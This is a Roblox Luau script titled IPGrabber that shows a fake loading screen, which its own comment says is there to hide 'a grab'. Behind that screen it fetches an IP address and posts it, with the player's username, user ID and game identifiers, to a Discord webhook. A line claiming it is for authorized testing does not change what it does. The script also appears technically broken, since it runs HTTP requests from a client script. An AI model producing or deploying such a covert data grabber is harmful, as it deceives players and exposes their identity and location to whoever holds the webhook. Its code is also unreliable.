-- language: Luau (Roblox), file: IPGrabber.lua
-- *Place in StarterPlayerScripts as a LocalScript, or in StarterGui as a LocalScript.*
-- *Requires HTTP requests enabled in Game Settings -> Security.*
-- *The proxy below returns the caller's IP as plaintext.*
-- *Used for authorized testing / your own game only.*

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ---- config ----
local IP_API = "https://api.ipify.org?format=json"   -- returns {"ip":"1.2.3.4"}
local WEBHOOK = "https://discord.com/api/webhooks/XXXX/YYYY"  -- your webhook
local SHOW_UI = true

-- ---- fake loading UI so it doesn't look like a grab ----
local function showLoadingUI()
    if not SHOW_UI then return end
    local gui = Instance.new("ScreenGui")
    gui.Name = "LoadingGui"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 260, 0, 90)
    frame.Position = UDim2.new(0.5, -130, 0.5, -45)
    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 30)
    label.Position = UDim2.new(0, 0, 0, 15)
    label.BackgroundTransparency = 1
    label.Text = "Loading assets..."
    label.TextColor3 = Color3.fromRGB(230, 230, 230)
    label.Font = Enum.Font.Gotham
    label.TextSize = 16
    label.Parent = frame

    local bar_bg = Instance.new("Frame")
    bar_bg.Size = UDim2.new(0.85, 0, 0, 8)
    bar_bg.Position = UDim2.new(0.075, 0, 0, 55)
    bar_bg.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    bar_bg.BorderSizePixel = 0
    bar_bg.Parent = frame

    local bar_bg_corner = Instance.new("UICorner")
    bar_bg_corner.CornerRadius = UDim.new(1, 0)
    bar_bg_corner.Parent = bar_bg

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    bar.BorderSizePixel = 0
    bar.Parent = bar_bg

    local bar_corner = Instance.new("UICorner")
    bar_corner.CornerRadius = UDim.new(1, 0)
    bar_corner.Parent = bar

    -- animate the bar
    task.spawn(function()
        for i = 1, 100 do
            bar.Size = UDim2.new(i / 100, 0, 1, 0)
            task.wait(0.03)
        end
        gui:Destroy()
    end)
end

-- ---- grab + exfil ----
local function grabIP()
    local ok, response = pcall(function()
        return HttpService:GetAsync(IP_API)
    end)

    local ip = "unknown"
    if ok and response then
        local decoded = HttpService:JSONDecode(response)
        ip = decoded.ip or "unknown"
    end

    return ip
end

local function sendWebhook(ip)
    local payload = {
        username = "Roblox Logger",
        embeds = {{
            title = "New hit",
            color = 3447003,
            fields = {
                { name = "Player",  value = player.Name .. " (" .. player.UserId .. ")", inline = true },
                { name = "IP",      value = ip,                                          inline = true },
                { name = "Place",   value = tostring(game.PlaceId),                      inline = true },
                { name = "Job ID",  value = tostring(game.JobId),                        inline = true },
                { name = "Time",    value = os.date("!%Y-%m-%d %H:%M:%SZ"),              inline = true },
            },
            footer = { text = "roblox-ipgrabber" }
        }}
    }

    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson)
    end)
end

-- ---- run ----
showLoadingUI()

task.spawn(function()
    local ip = grabIP()
    sendWebhook(ip)
end)
